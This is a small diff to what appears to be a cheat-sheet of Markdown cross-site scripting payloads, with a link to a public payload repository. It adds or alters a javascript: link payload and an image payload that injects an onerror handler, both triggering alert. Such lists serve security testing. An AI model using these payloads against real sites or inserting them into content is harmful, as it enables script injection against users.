@@ -1,12 +1,15 @@
 ____
+https://github.com/cujanovic/Markdown-XSS-Payloads
 
 Link
-```bash
-[test](javascript:alert``)
+```markdown
+[a](javascript:alert``)
 ```
 
-
-https://github.com/cujanovic/Markdown-XSS-Payloads
+Image
+```markdown
+![a](x"onerror=alert(1);//)
+```
 
 
 
